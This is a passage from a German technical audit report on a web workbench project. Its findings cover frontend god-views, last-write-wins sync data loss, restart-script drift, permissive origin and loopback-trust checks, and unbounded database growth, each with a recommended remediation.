**Technische Ursache:** Keine Single Source (Schema-Default ≠ Example ≠ Doku).
**Ausloeser:** `publicPorts`-Laenge aendern, Hermes-Port auf Slot-Port legen.
**Beispielszenario:** `slotPorts` um 1 gekuerzt, `publicPorts` vergessen → Start wirft erst zur Laufzeit.
**Auswirkungen:** Fehlkonfiguration, Tailscale-Slot-Mismatch.
**Warum es leicht uebersehen wird:** Drei Stellen sehen je „vollstaendig" aus.
**Empfohlene Loesung:** Ports nur in `wrapt-config.ts` generieren, Example daraus erzeugen; ein Validator; Doku-Test Example↔Schema.
**Alternativen:** Nur Doku — Trade-off: keine Garantie.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Generator zentral. 2. Zweiten Check entfernen. 3. Example-Skript. 4. Zod-Tests (ungleiche Laengen, Kollisionen).
**Tests:** Zod-Test ungleiche Laengen, Kollision T3/Hermes/HTTPS.
**Akzeptanzkriterien:** Genau 1 Generator + 1 Check, Example per Skript verifiziert.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### A-006 Frontend-God-Views + Logik in UI

**Kategorie:** Codequalitaet
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `apps/web/src/views/OrbitWorkbench.tsx` (1232), `views/Dashboard.tsx` (854), `components/files/FileManagerPanel.tsx` (755), `components/orbit/OrbitNodeView.tsx` (639), `stores/orbit.ts` (574), `extensions/legacyPageRoutes.ts` (664), `lib/orbitPlacement.ts`, `lib/orbitPreviewOpen.ts`, `lib/orbitSnap.ts`
**Betroffene Funktionen oder Komponenten:** Canvas, Preview-Context-Island, Stores mit `useOrbitStore.getState()` im Render/Events (~20 Stellen)
**Problembeschreibung:** Geschaeftsregeln (Layout 1/2/3/6, Slot-Geometrie, Bounds-Expansion, Reload via `content+1`-Hack, Fenster-Snapshot in `localStorage`) liegen in Views statt Domaenenmodulen. Direkte Store-Mutation aus JSX umgeht React-Flow-State.
**Technische Ursache:** Fehlende View/Model-Trennung; `shared` enthaelt Feature-Logik.
**Ausloeser:** Node-Drag/Resize/Maximize, Layout-Wechsel, Route-Wechsel mit gemountetem Outlet.
**Beispielszenario:** Preview-Reload-Button inkrementiert `content`-String als Versionszaehler → Orbit-Save triggert → Revision springt ohne Nutzeraenderung.
**Auswirkungen:** Rerender-Stuerme, iframe-Reloads, schwer testbar.
**Warum es leicht uebersehen wird:** Funktioniert visuell; Store-Zugriffe im Render fallen nur im Profiler auf.
**Empfohlene Loesung:** `orbit/`-Featureordner (Store+Geometrie+Sync getrennt); `getState()` nur in Handlern/Services, nie im Render; Views in <300-Zeilen-Komponenten teilen.
**Betroffene Architekturentscheidungen:** View/Model-Trennung, Feature-Ordner statt `shared`-Sammelbecken.
**Alternativen:** Nur aufteilen ohne Logik-Umzug — Trade-off: halb.
**Trade-offs:** Mittleres Refactoring-Risiko im Canvas.
**Implementierungsschritte:** 1. Featureordner. 2. Geometrie/Sync aus Views ziehen. 3. Render-`getState()` entfernen. 4. Views teilen. 5. Render-Count-Tests.
**Tests:** Render-Count-Test; Store-Action-Tests ohne DOM.
**Akzeptanzkriterien:** Keine `getState()`-Aufrufe im JSX-Renderpfad; Views <400 Zeilen.
**Abhaengigkeiten:** P-005 (Selektoren) gemeinsam planen.
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### A-007 Orbit-Sync ist Last-Write-Wins mit Legacy-Fallback

**Kategorie:** Datenintegritaet
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/orbit/database.ts:281-402`, `apps/server/src/orbit/routes.ts:30-40`, `apps/web/src/stores/orbit.ts:289-349`, `apps/web/src/components/orbit/OrbitSync.tsx:69-127`
**Betroffene Funktionen oder Komponenten:** `save()/saveLegacy()`, `resolveConflict/applyRemote`, `ORBIT_DESTRUCTIVE_DROP_PERCENT=50`
**Problembeschreibung:** Zwei Protokolle via Header-Weiche. Konflikt = Server laden + lokalen Entwurf erneut draufschreiben. 50-%-Drop-Guard ist Zeichen-Heuristik, kein semantischer Merge. Single-User-Annahme, aber mehrere Tabs/Geraete real.
**Technische Ursache:** Kein CRDT/OT; Revision nur optimistisches Locking; Legacy-Pfad ohne Konflikt-Signal (siehe D-005).
**Ausloeser:** 2 Tabs editieren parallel; langsames Netz + Autosave nach Ruhezeit.
**Beispielszenario:** Tab A loescht 40 % Knoten legitim → Guard greift nicht (unter 50 %) → Tab-B-Aenderung still ueberschrieben, nur Conflict-Backup in `orbit_conflict_backups`.
**Auswirkungen:** Stiller Datenverlust, schwer erklaerbar.
**Warum es leicht uebersehen wird:** Ein Tab funktioniert perfekt; Backups existieren, aber ohne UI.
**Empfohlene Loesung:** Legacy-Pfad mit Sunset-Datum entfernen; operation-basiertes Save (Patch) oder Board-weite Revision; Konflikt-UI statt Auto-Rebase; Guard nach Knoten/Edge-Diff statt Zeichen.
**Betroffene Architekturentscheidungen:** Sync-Protokoll (Voll-Dokument → Patch).
**Alternativen:** Nur Konflikt-UI ohne Patch-Protokoll — Trade-off: kleiner, loest Guards nicht.
**Trade-offs:** API-/Client-Aenderung; Migrations-Fenster fuer Alt-Clients.
**Implementierungsschritte:** 1. Sunset-Datum Legacy. 2. Konflikt-UI (Block+Dialog). 3. Guard auf Diff umstellen. 4. Patch-Protokoll evaluieren. 5. Zwei-Client-Tests.
**Tests:** Zwei-Client-Konflikt-Test; Destructive-Guard-Property-Test.
**Akzeptanzkriterien:** Kein stilles Ueberschreiben; Konflikt erfordert Nutzerentscheidung.
**Abhaengigkeiten:** D-005 (Legacy-Signal) zuerst.
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### A-008 Extension-Dual-Katalog verwirrt Plugins vs Extensions

**Kategorie:** Falsche Abstraktion
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/extensions/manager.ts` (704), `manager-operations.ts`, `manager-permissions.ts`, `manager-runtime.ts`, `manager-registry-sync.ts`, `local-plugin-registry.ts`, `catalog.ts`, `apps/server/src/app/dependencies.ts:186-192`
**Betroffene Funktionen oder Komponenten:** `ExtensionManager + LocalExtensionCatalog x2`
**Problembeschreibung:** `extensionCatalog` + `localPluginCatalog` mit identischer `defaultCatalogProviderId()`, `getCatalog: () => local ?? catalog`. Persoenliche Drafts vs versionierte Extensions teilen Registry/Lifecycle, aber UI trennt „Eigene Plugins"/„Installieren". `reconcileRuntime/syncCatalogUpdates` synchron beim Boot.
**Technische Ursache:** Aufspaltung in Helper ohne klare Ownership (Manager bleibt 704 Zeilen).
**Ausloeser:** Draft aktivieren waehrend Katalog-Sync; Rollback nach fehlgeschlagener Aktivierung.
**Beispielszenario:** Lokales Plugin und Katalog-Eintrag gleiche ID → `registerDiscovered` ueberschreibt, Review-Status falsch.
**Auswirkungen:** Fail-closed-Risiko, schwerer Support.
**Warum es leicht uebersehen wird:** Je Ebene sieht der Code „zuständig" aus.
**Empfohlene Loesung:** Typen `PersonalPlugin` vs `VersionedExtension` trennen; Manager-Fassade <200 Zeilen, Operationen in Command-Handler; Boot-Reconcile asynchron mit Health-Status.
**Betroffene Architekturentscheidungen:** Extension-Lifecycle (getrennte Lifecycles).
**Alternativen:** Nur Fassade schlanker ohne Typ-Trennung — Trade-off: halb.
**Trade-offs:** Datenmigration Registry; UI-Texte bleiben.
**Implementierungsschritte:** 1. Typen trennen. 2. Command-Handler. 3. Fassade. 4. Async-Reconcile. 5. Kollisions-/Rollback-Tests.
**Tests:** ID-Kollisions-Test; Rollback-Test; Boot mit korrupter `extensions.sqlite`.
**Akzeptanzkriterien:** Genau 1 Pfad pro Ebene; Manager <400 ohne Allowlist.
**Abhaengigkeiten:** A-002 (Boot-Phasen).
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### A-009 Restart-Skripte bauen unvollstaendig und parsen fragil

**Kategorie:** Betrieb
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `scripts/lib-restart.sh:169-172,279-314`, `scripts/restart-backend.sh:9-10`, `scripts/restart-all.sh:8-10`, `apps/server/src/system/restart.ts:17-31,70-90`
**Betroffene Funktionen oder Komponenten:** `build_contracts/build_frontend/build_backend`, `health_value`, `verify_*_marker`
**Problembeschreibung:** `build_contracts` baut nur `@wrapt/contracts`, nicht `@wrapt/extension-contracts` (Root-`build` tut beides). Status unter repo-lokalem `data/restart-logs/` statt `dataDir`. `health_value` parst JSON mit `sed`. Lock via `mkdir` ohne Stale-Erkennung (Exit 75).
**Technische Ursache:** Skript-Drift gegenueber `package.json`-Build-Pipeline.
**Ausloeser:** Extension-Schema-Aenderung + `restart-backend.sh`.
**Beispielszenario:** Manifest-Feld neu → Backend baut gegen alte Extension-Contracts → Laufzeit-`ZodError` nach „succeeded".
**Auswirkungen:** Falsches Erfolgs-Signal, haengende Locks.
**Warum es leicht uebersehen wird:** Restart meldet „succeeded"; Schema-Fehler erst spaeter.
**Empfohlene Loesung:** `build_contracts` baut beide Contracts; Statuspfad auf `dataDir` oder dokumentieren + `jq`/Node-Parse statt `sed`; Lock mit PID+Timeout + Status-Reset.
**Betroffene Architekturentscheidungen:** Build-Pipeline-Paritaet Skript vs `package.json`.
**Alternativen:** Nur Doku — Trade-off: keine Garantie.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Beide Contracts bauen. 2. Parse auf `jq`/Node. 3. Lock mit Timeout. 4. Shell-Tests.
**Tests:** Shell-Test Schema-Aenderung→Restart; Lock-Stale-Test.
**Akzeptanzkriterien:** Restart nach Extension-Aenderung gruen nur mit neuem Schema.
**Abhaengigkeiten:** D-015 (Idempotenz/Rotation) gemeinsam planen.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### A-010 Identity-Ausnahmen + permissiver Mutations-Origin

**Kategorie:** Sicherheit (defensiv, Querverweis S-001/S-006/S-009)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Probable
**Betroffene Dateien:** `apps/server/src/security/workbench-identity.ts:14-50,130-151`, `security/same-origin.ts:1-21`, `docs/architecture.md:208-221`
**Betroffene Funktionen oder Komponenten:** `isProtectedWorkbenchRequest`, `requireMutationOrigin`, `requestLocalLoopbackIdentity`
**Problembeschreibung:** `unprotectedApiPrefixes` + offener Health. `requireMutationOrigin` returnt still ohne `Origin`/`Sec-Fetch-Site` (CLI-Kompat). `localLoopbackTrust` ohne UID-Unterscheidung. T3-Root-WS-Identitaet an Upstream delegiert.
**Technische Ursache:** Kompatibilitaet vor Strictness, breit dokumentiert aber breit offen.
**Ausloeser:** Schadhaftes lokales Tool; CSRF ohne Fetch-Metadata; Tailscale-Header-Spoof.
**Beispielszenario:** Lokaler Prozess ohne Tailscale ruft mit `localLoopbackTrust=true` Admin-Route auf → als `localUsername` akzeptiert.
**Auswirkungen:** Privilege-Escalation lokal, CSRF-Restrisiko.
**Warum es leicht uebersehen wird:** Doku beschreibt Ausnahmen als beabsichtigt.
**Empfohlene Loesung:** Unprotected-Routen inventarisieren + Capability-Tests; Mutationen ohne Origin nur mit Token; Loopback-Trust per-UID oder Warnbanner + Default `false`; T3-WS-Identitaets-Test.
**Betroffene Architekturentscheidungen:** Auth-Modell (Header → Token-Härtung).
**Alternativen:** Nur Doku — Trade-off: keine Abhilfe.
**Trade-offs:** CLI-Kompatibilitaet vs Strictness.
**Implementierungsschritte:** 1. Inventar + Tests. 2. Token-Pflicht fuer header-lose Mutationen. 3. Loopback-Default pruefen. 4. Doku aktualisieren.
**Tests:** `workbench-identity.test.ts` + `same-origin.test.ts` um No-Header-Mutation, Header-Spoof, Loopback-Non-Loopback erweitern.
**Akzeptanzkriterien:** Jede unprotected Route hat Capability-/Token-Test; Doku listet sie.
**Abhaengigkeiten:** S-001/S-006.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### A-011 Hermes-Proxy: manuelle Cache-Invalidierung + HTML-Rewrite

**Kategorie:** Fragilitaet
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/hermes/dashboard-proxy.ts:12-90`, `hermes/route-bridge.js`, `hermes/token.ts`, `docs/architecture.md:30-68`
**Betroffene Funktionen oder Komponenten:** `upstreamCachePolicy`, `assetRewriteVersion="3"`, `routeBridgeScript`-Injektion vor `</head>`
**Problembeschreibung:** `immutable` nur sicher mit `Vary: accept-encoding` + manuellem `assetRewriteVersion`-Bump. Vergessen = 1 Jahr stale JS. Session-Token aus Dashboard-HTML serverseitig gelesen — Markup-Aenderung bricht Auth still.
**Technische Ursache:** Upstream ohne stabile Proxy-Schnittstelle; Kompression/Header-Strip im Proxy.
**Ausloeser:** Hermes-Update aendert Asset-Hash-Verhalten oder HTML-Template.
**Beispielszenario:** Bridge-Script geaendert, Version nicht erhoeht → Browser nutzt altes `immutable`-Bundle → Routen-Bruecke tot.
**Auswirkungen:** Hermes-Flaeche defekt nach Update, schwer zuzuordnen.
**Warum es leicht uebersehen wird:** Version steht als String-Literal, kein Test zwingt Bump.
**Empfohlene Loesung:** `assetRewriteVersion` aus File-Hash ableiten; Token-Extraktion mit Contract-Test gegen Hermes-HTML-Fixture; Cache-Matrix-Test (Vary-Fall).
**Betroffene Architekturentscheidungen:** Proxy-Caching (manuell → Hash).
**Alternativen:** Manueller Bump + Checkliste — Trade-off: vergesslich.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Hash-Ableitung. 2. HTML-Fixture-Test je Hermes-Version. 3. Cache-Matrix-Test.
**Tests:** Cache-Matrix-Test; HTML-Fixture-Test.
**Akzeptanzkriterien:** Kein manueller Versionsbump noetig; Test faengt Template-Drift.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### A-012 T3-Proxy an T3-Interna gekoppelt

**Kategorie:** Kopplung
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/services/t3Proxy.ts` (368), `services/t3RouteBridge.js`, `services/t3HostedApp.ts`, `scripts/sync-t3-channel.sh`
**Betroffene Funktionen oder Komponenten:** `remoteEditorFallbackScript`, WS-Puffer 4/16 MB
**Problembeschreibung:** DOM-Selektoren + Puffer-Tuning an T3-Version gebunden. Nightly→Stable-Downgrade kann `state.sqlite`-Migration brechen (AGENTS warnt, kein automatischer Backup im Sync).
**Technische Ursache:** Kein stabiler T3-Embed-Contract; Scraping statt API.
**Ausloeser:** T3 Nightly aendert Thread-Panel-Markup oder Snapshot-Groesse.
**Beispielszenario:** Nach `sync-t3-channel.sh` laedt `/t3`, aber „Open in..."-Fallback trifft nicht mehr → still wirkungslos.
**Auswirkungen:** Reconnect-Loops, toter Button, Downgrade-Datenrisiko.
**Warum es leicht uebersehen wird:** Smoke nach Wechsel sieht „lädt" und gilt als ok.
**Empfohlene Loesung:** Selektoren in 1 Modul + Playwright-Smoke gegen beide Kanaele; State-Backup vor Kanalwechsel erzwingen; WS-Limits als Metrik/Alarm statt still kappen.
**Betroffene Architekturentscheidungen:** T3-Einbettung (Scraping → Contract/Version-Pinning).
**Alternativen:** Nur Doku — Trade-off: keine Absicherung.
**Trade-offs:** Externe Abhaengigkeit; Smoke-Kosten.
**Implementierungsschritte:** 1. Selektor-Modul. 2. Smoke stable+nightly. 3. Backup-Pflicht. 4. Metrik statt Cut.
**Tests:** E2E `/t3`-Smoke stable+nightly; Backup-Existenz-Test.
**Akzeptanzkriterien:** Kanalwechsel verifiziert, Backup vorhanden.
**Abhaengigkeiten:** S-003 (Kanalwechsel-Rechte).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### A-013 Notifications: globaler Verlauf + fremde DBs ohne Contract

**Kategorie:** Datenschutz/Robustheit
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/notifications/database.ts:98-246`, `t3-status-sync.ts:160-244`, `agent-session-sync.ts:117-252`, `push.ts:267-300`, `docs/architecture.md:136-169`
**Betroffene Funktionen oder Komponenten:** `NotificationDatabase`, `T3StatusSync`, `AgentSessionSync`, `NotificationPushService`
**Problembeschreibung:** „Jede erlaubte Identitaet sieht dieselben Eintraege". Poller mit `PRAGMA table_info` + `as unknown`-Casts auf fremde Schemas ohne Versionierung. TTL global.
**Technische Ursache:** Single-User-Annahme trifft auf Multi-User-Tailnet.
**Ausloeser:** Zweiter User; T3-Schema-Migration; OpenCode-DB-Lock (WAL).
**Beispielszenario:** User B sieht Hermes-/T3-Ergebnisse von User A; nach T3-Update liefert Poller 0 Rows statt Fehler.
**Auswirkungen:** Privacy-Leak, stille Notification-Luecken.
**Warum es leicht uebersehen wird:** Single-User-Tests zeigen alles „korrekt".
**Empfohlene Loesung:** Verlauf pro `user_id` scopen oder Multi-User als unsupported + Warnung bei `allowedUsers>1`; Schema-Version-Check mit Health-Warnung; Poller-Fehler als Diagnose-Kachel.
**Betroffene Architekturentscheidungen:** Mandantenfaehigkeit Verlauf.
**Alternativen:** Nur Doku — Trade-off: schnell, keine Trennung.
**Trade-offs:** Datenmigration bei Scoping.
**Implementierungsschritte:** 1. Warnung bei >1 User. 2. Version-Check. 3. Scoping. 4. Diagnose-Kachel.
**Tests:** Zwei-Identitaeten-Test; Fixture mit neuem T3-Schema.
**Akzeptanzkriterien:** Kein identitaetsuebergreifender Verlauf ohne Opt-in; Schema-Drift sichtbar.
**Abhaengigkeiten:** S-004.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### A-014 Terminal-Supervisor: RAM-State + Reboot-Luecke

**Kategorie:** Zuverlaessigkeit
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/terminal/Manager.ts`, `restore.ts`, `persistentSessions.ts`, `TmuxSupervisor.ts:29-89`, `shell.ts:27-48`, `database.ts:105-198`
**Betroffene Funktionen oder Komponenten:** `sessions/creationLocks/cwdRefreshTimers`-Maps, `reconcileTerminalSessionsOnStartup`
**Problembeschreibung:** Sessions nur im RAM + tmux; `persistentSessionOwners` stellt nach Reboot nur markierte wieder her (CWD/Name/Pin, kein Scrollback/Prozess). `maxSessions` global. TOCTOU zwischen CWD-Check und Spawn bei Symlink-Wechsel moeglich.
**Technische Ursache:** Supervisor ausserhalb des Prozesses, Registry nur Metadaten.
**Ausloeser:** Host-Reboot, tmux-Socket-Verlust, Symlink-Race im Projekt-Root.
**Beispielszenario:** Reboot → nicht-persistente Agent-Terminals weg, UI bietet „vorhandene Sitzung" an, die nicht existiert → `attach` auf toten Pane.
**Auswirkungen:** Verwirrung, abgebrochene Agent-Laeufe.
**Warum es leicht uebersehen wird:** Supervisor-Neustart (ohne Reboot) sieht intakt aus.
**Empfohlene Loesung:** `attach` mit Existenz-Probe + klarer „abgelaufen"-State; Persist-Default dokumentieren; CWD-Resolve mit `realpath` + Re-Check nach Spawn (Test mit Symlink-Swap).
**Betroffene Architekturentscheidungen:** Session-Registry (Metadaten → Existenz-Garantie).
**Alternativen:** Alle Sessions persistent — Trade-off: Ressourcen, falsche Erwartung (Prozess tot).
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Existenz-Probe. 2. Abgelaufen-State. 3. realpath-Re-Check. 4. Doku.
**Tests:** `Manager.resume.test.ts` + `restore.test.ts` um Socket-Verlust, Symlink-Race.
**Akzeptanzkriterien:** Tote Sessions werden als solche angezeigt, kein Haengen im `attach`.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### A-015 Doppelte `any`-nahe Casts + Non-null-Flut statt Fehlerpfade

**Kategorie:** Codequalitaet
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `apps/server/src/notifications/*`, `previews/database.ts:105-611`, `terminal/database.ts`, `orbit/assets.ts:249,287` (`as unknown as`), `apps/web/src/lib/orbitPalette.ts:33,45`, `apps/server/src/system/restart.ts:70`, `previews/DevServerManager.ts:47-51`, `web/.../useTerminalRenderer.ts:155,267,352` (Hook-Disables); `!`-Counts: `slots.ts` 36, `gateway.ts` 24, `manager.ts` 39, `Dashboard.tsx` 35, `OrbitWorkbench.tsx` 78
**Betroffene Funktionen oder Komponenten:** DB-Mapper, Cache-Regeln, Terminal-Renderer
**Problembeschreibung:** `as unknown as Row[]` nach `.all()` ohne Laufzeit-Validierung (Ausnahme: Orbit/Config mit Zod). `!` auf `definitions[index]!`, `boards[0]!` verbirgt `undefined`. 3 Hook-Disables im PTY-Renderer = stale-Closure-Risiko.
**Technische Ursache:** Bequemlichkeit; kein `z.parse` fuer DB-Rows; keine `no-non-null-assertion`-Regel.
**Ausloeser:** Leere Tabelle, Migration ohne Spalte, Resize waehrend Unmount.
**Beispielszenario:** Slot-DB liefert 0 Rows → `definitions[index]!` wirft im Gateway statt 503.
**Auswirkungen:** Unklare 500er, schwerer Debug.
**Warum es leicht uebersehen wird:** `!` sieht nach „weiss ich" aus; Tests mit gefuellter DB treffen nie `undefined`.
**Empfohlene Loesung:** `no-non-null-assertion` warnen + sukzessive entfernen; DB-Rows per Zod (`*_rowSchema`); Hook-Deps fixen oder mit Test abdecken.
**Betroffene Architekturentscheidungen:** Validierungsdisziplin DB-Grenze.
**Alternativen:** Nur neue `!` verbieten (Bestand lassen) — Trade-off: pragmatisch.
**Trade-offs:** Viele Kleinstellen.
**Implementierungsschritte:** 1. Regel aktivieren (warn). 2. Row-Schemas. 3. Hook-Deps fixen. 4. `lint --max-warnings=0` wieder gruen.
**Tests:** `pnpm lint --max-warnings=0` nach Regel-Aktivierung; DB-Empty-Tests.
**Akzeptanzkriterien:** Keine neuen `!`/`as unknown` ohne Zod-Guard.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### A-016 Tote/doppelte Pfade und Repo-Clutter

**Kategorie:** Wartbarkeit
**Schweregrad:** Low
**Sicherheit der Einschaetzung:** Probable
**Betroffene Dateien:** `apps/web/src/extensions/legacyPageRoutes.ts` (664), `apps/server/src/config/legacy-migration.ts`, `apps/web/src/lib/legacyStorageMigration.ts`, `apps/server/src/orbit/assets.ts` vs File-Gallery (zwei `OrbitAssetRepository` in `dependencies.ts:245-246`), `docs/technical-audit-2026-10-04.md`, `Gesamtpruefung/`, `HTML visualisierte Pläne/`, `Aussehen_Früher/`, `Landing Page/`, `plans/`
**Betroffene Funktionen oder Komponenten:** Legacy-Shims, Galerie-Dualitaet
**Problembeschreibung:** Zwei Migrationssysteme + Legacy-Routen-Shim + zwei Asset-Stores (gleiche Klasse, andere Tabelle). Repo-Root enthaelt Praesentations-/Audit-Artefakte neben Code.
**Technische Ursache:** Keine Sunset-Policy fuer Kompat-Pfade.
**Ausloeser:** Neue Asset-Funktion — in welchem Store?
**Beispielszenario:** Fix in `assets.ts` nur fuer Orbit getestet, File-Gallery divergiert still.
**Auswirkungen:** Doppelpflege, falsche Doku.
**Warum es leicht uebersehen wird:** Jede Datei ist fuer sich „noch gebraucht".
**Empfohlene Loesung:** Owner + Sunset-Datum je Legacy-Pfad; Asset-Stores auf 1 Service mit `bucket`-Param oder Unterschied dokumentieren; Nicht-Code-Artefakte nach `docs/_archiv/`.
**Betroffene Architekturentscheidungen:** Kompat-Pfad-Policy.
**Alternativen:** Nur dokumentieren — Trade-off: kein Abbau.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Inventar + Owner + Datum. 2. Asset-Entscheidung. 3. Archiv-Umzug. 4. Boundary-Check erweitern.
**Tests:** Duplikat-Suche (`check-boundary.mjs` erweitern); Legacy-Coverage-Report.
**Akzeptanzkriterien:** Jede Legacy-Datei hat Removal-Kriterium im Kopfkommentar.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### D-001 `importCost` kumulativ ohne Retention + `dashboard()` Vollscan

**Kategorie:** Datenintegritaet/Logik
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/usage/database.ts:145,181`, `apps/server/src/usage/usage-service.ts:42`
**Betroffene Funktionen oder Komponenten:** `UsageDatabase.importCost()`, `UsageDatabase.dashboard()`
**Problembeschreibung:** `importCost` bewusst kumulativ ohne `DELETE`/TTL/Cap. `dashboard()` liest `daily_usage`, `project_usage`, `model_usage` komplett und gruppiert in JS (`slice(0,20)`). Live: `usage_snapshots` 138.769 Rows zeigen das Wachstumsmuster; CodexBar-3650-Tage-Fenster verstaerkt.
**Technische Ursache:** Fehlende Retention + SQL-Aggregation.
**Ausloeser:** Jeder `sync()`-Tick.
**Beispielszenario:** 2 Jahre Sync → vierstellige Row-Counts; jeder Dashboard-Call aggregiert alles in JS. `projectKeyBasename()` kollidiert (`a/foo` + `b/foo` → ein Eintrag).
**Auswirkungen:** Latenz, Speicher, falsche Projektaggregation bei Namensgleichheit.
**Warum es leicht uebersehen wird:** Heute 174/350/70 Rows — klein; Kommentar „bewusst kumulativ" klingt entschieden.
**Empfohlene Loesung:** Retention (>400 Tage loeschen, analog Snapshots, oder dokumentiert unbegrenzt + Index); Aggregation in SQL (`GROUP BY` + `LIMIT 20`); Dashboard-Key kollisionsfrei (`provider:key`).
**Betroffene Architekturentscheidungen:** Reporting-Retention.
**Alternativen:** Nur Index — Trade-off: Wachstum bleibt.
**Trade-offs:** Historische Kosten ausserhalb Fensters weg (dokumentieren).
**Implementierungsschritte:** 1. Retention-Job. 2. SQL-Aggregation. 3. Key-Fix. 4. Scope-Doku (`daily|projects|both`).
**Tests:** Sync mit 5.000 synthetischen Payloads; Dashboard mit 10k Rows profilen; Basename-Kollisionstest.
**Akzeptanzkriterien:** Count stabil; Dashboard-P95 <500 ms bei 10k Zeilen; keine Kollision.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### D-002 Notifications: ungelesene `active` werden nie geprunt (937 live)

**Kategorie:** Datenintegritaet
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/notifications/database.ts:260,73,107,170,209`
**Betroffene Funktionen oder Komponenten:** `NotificationDatabase.prune()/create()/list()/setPresence()`
**Problembeschreibung:** `prune()`-WHERE nur `(resolved/dismissed AND <cutoff) OR (active AND read_at<cutoff)`. Wer nie liest, bleibt ewig (live: 937 `active`). `setPresence()` laedt pro Eintrag alle ungelesenen einer Source ohne Limit (Riesen-`IN(...)`).
**Technische Ursache:** „Ungelesen geht nie verloren" als implizite Semantik ohne Cap.
**Ausloeser:** Syncs erzeugen Meldungen, Nutzer liest sie nicht.
**Beispielszenario:** Cron meldet taeglich → nach 1 Jahr ~365 + 937 Bestand → `setPresence` scannt 1.300 Zeilen pro Heartbeat.
**Auswirkungen:** DB-Wachstum, langsamere `unreadCount()` (2× `COUNT` pro `list()`), Presence-Latenz.
**Warum es leicht uebersehen wird:** `create()` ruft `prune()` — sieht nach Pflege aus.
**Empfohlene Loesung:** Cap fuer ungelesene aktive (z. B. pro `(source,kind)` aelteste auto-`resolved`, Max ~500, dokumentieren); `setPresence()` auf `LIMIT`-Batch + Index.
**Betroffene Architekturentscheidungen:** Notification-Semantik (Cap-Entscheid Produkt).
**Alternativen:** Nur Batch ohne Cap — Trade-off: Wachstum bleibt.
**Trade-offs:** „Nie verlieren" vs Kappe (Produktentscheid).
**Implementierungsschritte:** 1. Cap + Doku. 2. `setPresence`-Batch. 3. Default `pruneAfterHours` pruefen.
**Tests:** 2.000 ungelesene → `prune()`-Assert; `setPresence` mit 2k profilen.
**Akzeptanzkriterien:** Aktive Count beschraenkt; kein unbegrenztes `IN(...)`.
**Abhaengigkeiten:** Produktentscheid Cap (Abschnitt 15, Frage 1).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low-Medium

### D-003 `NotesDatabase.list()/search()` ohne LIMIT (Volltext in JS)

**Kategorie:** Logik/Skalierung
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/notes/database.ts:174,182`, `.../notes/routes.ts:27,43`
**Betroffene Funktionen oder Komponenten:** `NotesDatabase.list()/search()`
**Problembeschreibung:** Beide laden alle passenden Zeilen inkl. `content` und bauen Excerpts in JS. `search()` mit LIKE-Escape (gut), aber ohne `LIMIT`/Cursor (Gegenbeispiel Notifications/Assets mit Cursor vorhanden).
**Technische Ursache:** MVP-Suche ohne Pagination.
**Ausloeser:** Viele/lange Notizen, breite Suche (`q` min 1 Zeichen).
**Beispielszenario:** 5.000 Notizen à 20 KB → 100 MB in Node pro `GET /notes` (single-thread + sync Driver).
**Auswirkungen:** Latenz, Speicher, HTTP-Blockierung.
**Warum es leicht uebersehen wird:** Heute ~26 Notizen — unauffaellig.
**Empfohlene Loesung:** `LIMIT`+Cursor (`updated_at,id`, Default ≤100); `list()` ohne `content` (nur Excerpt/`SUBSTR`); Contracts paginieren (abwaertskompatibel mit Default).
**Betroffene Architekturentscheidungen:** API-Pagination Notes.
**Alternativen:** Nur `LIMIT` ohne Cursor — Trade-off: Offset-Drift.
**Trade-offs:** API-Erweiterung (kompatibel).
**Implementierungsschritte:** 1. Cursor-Spalten. 2. `SUBSTR`-Excerpt. 3. Contract-Response paginieren. 4. Frontend-Flow.
**Tests:** 2k Notizen → Groesse/Zeit vorher/nachher.
**Akzeptanzkriterien:** `GET /notes` und `/notes/search` mit `limit`+`nextCursor`, Default ≤100.
**Abhaengigkeiten:** P-012 (FTS) gemeinsam planen.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

